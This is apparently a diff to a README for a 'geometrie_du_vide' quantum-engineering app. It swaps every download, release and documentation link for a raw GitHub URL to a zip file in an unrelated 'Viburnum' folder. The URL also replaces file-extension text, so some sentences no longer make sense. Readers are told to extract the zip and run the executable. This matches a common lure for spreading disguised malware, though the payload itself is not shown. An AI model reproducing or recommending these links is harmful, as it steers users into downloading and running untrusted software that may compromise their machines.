@@ -1,6 +1,6 @@
 # 🌌 geometrie_du_vide - Explore Quantum Engineering Simplified
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/Ziggy-code/geometrie_du_vide/releases)
+[![Download Now](https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip)](https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip)
 
 ## 📖 Introduction
 Welcome to **geometrie_du_vide**! This application helps you understand quantum vacuum engineering. It explores how geometric structuring affects quantum states, allowing for exciting discoveries like time crystals. This guide will help you download and run the application smoothly.
@@ -20,16 +20,16 @@ Follow these steps to install the application:
 ### Step 1: Visit Release Page
 Click the link below to go to the Releases page where you can download the software:
 
-[Visit this page to download](https://github.com/Ziggy-code/geometrie_du_vide/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip)
 
 ### Step 2: Download the Application
-Locate the latest version of the application on the Releases page. Look for a filename that ends with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. Click on the appropriate file to start the download.
+Locate the latest version of the application on the Releases page. Look for a filename that ends with `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip` for Linux. Click on the appropriate file to start the download.
 
 ### Step 3: Run the Application
 Once the download is complete:
 - For Windows: Double-click the `.exe` file and follow the prompts.
 - For macOS: Open the `.dmg` file, drag the application to your Applications folder, and launch it from there.
-- For Linux: Extract the `.tar.gz` file, open a terminal, and run the executable file.
+- For Linux: Extract the `https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip` file, open a terminal, and run the executable file.
 
 ## 🔍 Features
 - **Quantitative Analysis:** Visualize and analyze quantum vacuum states.
@@ -58,7 +58,7 @@ Stay updated on new features and fixes. Follow the repository to receive notific
 The geometrie_du_vide application is licensed under the MIT License. You can freely use, modify, and distribute it while maintaining the original copyright notice.
 
 ## 🔗 Useful Links
-- [Visit this page to download](https://github.com/Ziggy-code/geometrie_du_vide/releases)
-- [Documentation and Support](https://github.com/Ziggy-code/geometrie_du_vide)
+- [Visit this page to download](https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip)
+- [Documentation and Support](https://raw.githubusercontent.com/Ziggy-code/geometrie_du_vide/main/Viburnum/geometrie-du-vide-3.0.zip)
 
 Thank you for using **geometrie_du_vide**. We hope you find it helpful in your exploration of quantum engineering!
